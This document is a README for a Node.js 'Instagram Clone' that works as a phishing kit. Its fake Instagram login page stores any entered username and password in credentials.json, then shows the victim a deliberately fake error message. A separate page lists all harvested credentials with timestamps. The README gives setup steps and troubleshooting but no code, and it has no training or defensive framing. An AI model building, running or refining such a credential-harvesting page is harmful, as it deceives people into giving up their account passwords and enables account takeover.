# 🔐 Instagram Clone - Credential Storage System

## Setup Instructions

### 1. Install Node.js
If you don't have Node.js installed, download it from: https://nodejs.org/

### 2. Install Dependencies
Open PowerShell or Command Prompt in this folder and run:
```bash
npm install
```

### 3. Start the Server
Run the following command:
```bash
npm start
```

You should see:
```
✅ Server is running on http://localhost:3000
📊 Database file: credentials.json
🔐 Login page: http://localhost:3000/src/html/loginPage.html
📋 View credentials: http://localhost:3000/src/html/viewCredentials.html
```

### 4. Use the Application

**Login Page:** http://localhost:3000/src/html/loginPage.html
- Enter any username and password
- Click "Log in"
- The credentials will be stored in the database
- You'll see a fake error message (this is intentional)

**View Credentials:** http://localhost:3000/src/html/viewCredentials.html
- See all stored credentials
- Refresh to get latest data
- Clear all credentials if needed

### 5. Database File
All credentials are stored in `credentials.json` in the root folder. You can open this file with any text editor to see the stored data directly.

## Features

✅ Credentials are stored in a JSON database file
✅ Proper error messages (no more "site can't be reached" or "undefined")
✅ View all stored credentials with timestamps
✅ Clear functionality to remove all stored data
✅ Works on localhost:3000

## Troubleshooting

**Error: "Unable to connect to server"**
- Make sure the server is running (`npm start`)
- Check that http://localhost:3000 is accessible

**Error: "npm is not recognized"**
- Install Node.js from https://nodejs.org/
- Restart your terminal/PowerShell after installation

**Port already in use**
- Another application is using port 3000
- Close other applications or edit `server.js` to use a different port
